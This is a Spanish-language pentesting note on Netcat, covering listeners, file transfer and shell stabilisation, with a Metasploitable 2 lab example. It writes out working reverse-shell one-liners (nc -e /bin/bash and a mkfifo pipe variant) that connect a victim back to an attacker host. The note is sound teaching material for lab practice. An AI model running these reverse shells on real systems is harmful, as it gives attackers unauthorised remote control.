# Netcat

## Descripción

Netcat (nc) es conocida como la **"navaja suiza de las redes"**. Es una herramienta de línea de comandos que permite leer y escribir datos a través de conexiones de red usando TCP o UDP. En pentesting se usa principalmente para establecer listeners que reciben reverse shells.

---

## Instalación

Viene preinstalada en Kali Linux. Para verificar:

```shell
nc -h
```

---

## Usos principales en pentesting

### 1. Levantar un listener (recibir una reverse shell)

```shell
nc -lvnp 4444
```

| Flag | Significado |
|------|-------------|
| `-l` | Modo escucha (listen) |
| `-v` | Verbose, muestra información de conexión |
| `-n` | No resolver DNS (más rápido) |
| `-p` | Puerto donde escuchar |

Cuando la víctima conecta, verás:
```
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 54321
```

### 2. Conectarse a un puerto (cliente)

```shell
nc 192.168.56.101 4444
```

### 3. Transferir archivos

**En la máquina receptora (escucha):**
```shell
nc -lvnp 4444 > archivo_recibido.txt
```

**En la máquina emisora:**
```shell
nc 192.168.56.102 4444 < archivo_a_enviar.txt
```

---

## Reverse shells con Netcat

Cuando tienes RCE en una víctima, puedes enviar una reverse shell con:

```shell
# Desde la víctima (si tiene nc con -e)
nc 192.168.56.102 4444 -e /bin/bash

# Alternativa si no tiene -e (versión OpenBSD)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.56.102 4444 > /tmp/f
```

---

## Mejorar una shell recibida con Netcat

Las shells recibidas via nc suelen ser inestables. Para mejorarlas:

```shell
# En la shell recibida, ejecutar:
python -c 'import pty; pty.spawn("/bin/bash")'

# O con Python 3:
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Esto convierte la shell básica en una pseudo-TTY más estable con prompt interactivo.

---

## Verificar conectividad entre máquinas

Útil para comprobar si una víctima puede conectar de vuelta a tu Kali:

**En Kali:**
```shell
nc -lvnp 4444
```

**Desde la víctima (via RCE):**
```shell
nc 192.168.56.102 4444
```

Si el listener recibe la conexión, la red bidireccional funciona correctamente.

---

## Consejos importantes

- Siempre levanta el listener **antes** de lanzar el exploit. La reverse shell intenta conectar en el momento exacto de la ejecución.
- Si el puerto está ocupado verás `Address already in use`. Usa otro puerto o mata el proceso con `sudo fuser -k 4444/tcp`.
- Netcat por sí solo no cifra la comunicación. Para entornos reales considera usar `ncat` (de nmap) que soporta SSL.

---

## Ejemplo real — Máquina Metasploitable 2

Usamos Netcat para verificar conectividad inversa entre Metasploitable y Kali mientras depurábamos por qué Metasploit no creaba sesión:

```shell
# En Kali
nc -lvnp 6666

# Desde la víctima via RCE en TWiki
nc 192.168.56.102 6666 -e /bin/sh
```

También lo usamos como listener alternativo al handler de Metasploit:

```shell
nc -lvnp 8888
# Luego en Metasploit: set DisablePayloadHandler true
```
